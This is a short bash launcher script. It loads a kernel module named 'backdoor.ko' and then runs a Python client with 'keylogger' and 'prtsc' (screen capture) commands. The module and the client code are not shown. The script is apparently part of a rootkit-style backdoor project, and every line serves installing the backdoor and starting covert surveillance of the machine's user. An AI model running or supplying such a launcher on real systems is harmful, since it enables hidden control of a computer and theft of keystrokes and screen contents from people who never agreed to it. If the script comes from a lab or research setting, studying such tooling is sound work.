#!/bin/bash

# INSERT KERNEL MODULE
insmod backdoor.ko

# RUN CLIENT 
python3 client.py keylogger
sleep 1  # Wait 1 seconds
python3 client.py prtsc